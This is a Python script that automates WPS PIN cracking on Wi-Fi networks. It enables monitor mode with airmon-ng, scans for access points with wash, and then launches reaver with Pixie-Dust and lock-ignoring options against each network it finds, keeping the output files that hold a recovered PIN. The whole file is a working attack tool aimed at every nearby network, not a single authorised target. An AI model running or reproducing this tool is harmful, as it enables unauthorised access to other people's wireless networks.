import os
import subprocess
import time
import shutil
import csv
import fileinput




os.system('clear')
print("Interfaces:\nPlease pick one:\n\n")
subprocess.call("sudo airmon-ng",shell=True)

interface = input("Enter your interface name: ") 
print("Search duration:\n\t1-59s\n\t1-1000m\n\t1-10d")
timeout_search = input("Search duration: ") 
print("Timeout:\n\t1-59s\n\t1-1000m\n\t1-10d")
timeout_attack = input("Search duration: ") 

os.system('clear')
if "mon" in interface:
	os.system('clear')
else:
	subprocess.call("sudo airmon-ng start "+interface,shell=True)
	os.system('clear')

os.system('clear')

if os.path.isfile( os.path.dirname(__file__)+"/tempfile.txt") or os.path.islink( os.path.dirname(__file__)+"/tempfile.txt"):
 os.remove( os.path.dirname(__file__)+"/tempfile.txt") 

subprocess.call(['sudo timeout -k 5 '+timeout_search+' wash -i wlan0mon  |tee ' + os.path.dirname(__file__) + '/tempfile.txt' ],shell=True)

with open( os.path.dirname(__file__)+"/tempfile.txt", 'r') as my_file:
  reader = csv.reader(my_file, delimiter=' ')
  my_list = list(reader)
os.system('clear')


for row in range(len(my_list)):
 try:
  if row:
   if not "BSSID" in my_list[row][0]:
    if not "Station" in my_list[row][0]:
     if not "----" in my_list[row][0]:
      if not "2.0  Yes" in my_list[row][0]:
       print("Attacking: " +my_list[row][-1])
       if not os.path.isfile( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt") or os.path.islink( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt"):
        subprocess.call(["echo 'Y\n' | sudo timeout -k 5 "+timeout_attack+" reaver -i "+interface+"mon"+" -b "+my_list[row][0]+"-v -K -Z -L --no-nacks --ignore-locks -c "+my_list[row][4]+" | tee  "+ os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt"],shell=True)
       with open( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt") as f:
        if "[+] WPS pin:" in f.read():
         print("Success")
        else:
          try:
           if os.path.isfile( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt") or os.path.islink( os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt"):
            os.remove( os.path.dirname(__file__)+'/'+my_list[row][-1]+'.txt') 
          except:
           pass
       os.system('clear')
 except:
  pass

subprocess.call("sudo airmon-ng stop "+interface+"mon",shell=True)

for row in range(len(my_list)):
 try:
  if row:
   if not "BSSID" in my_list[row][0]:
    if not "Station" in my_list[row][0]:
     if not "----" in my_list[row][0]:
      if os.path.isfile(os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt") or os.path.islink(os.path.dirname(__file__)+"/"+my_list[row][-1]+".txt"):
       pass
      else:
       print("Falta fazer para " + my_list[row][-1])

 except:
  pass
try:
 if os.path.isfile( os.path.dirname(__file__)+"/"+"tempfile.txt") or os.path.islink( os.path.dirname(__file__)+"/"+"tempfile.txt"):
  os.remove( os.path.dirname(__file__)+"/"+'tempfile.txt') 
except:
 pass
#!/bin/bash

